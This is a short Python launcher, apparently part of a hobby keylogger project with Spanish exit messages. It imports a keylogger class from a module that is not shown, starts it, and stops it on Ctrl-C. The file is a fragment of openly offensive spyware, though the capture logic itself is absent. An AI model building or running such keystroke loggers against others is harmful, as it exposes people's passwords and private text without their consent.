from keylogger import keylogger
import signal
import sys

def def_handler(sig,frame):
    print("\n[+] Saliendo..\n")
    my_keylogger.shutdown()
    sys.exit(1)
signal.signal(signal.SIGINT,def_handler)
if __name__ == "__main__":
    my_keylogger = keylogger()
    my_keylogger.start()
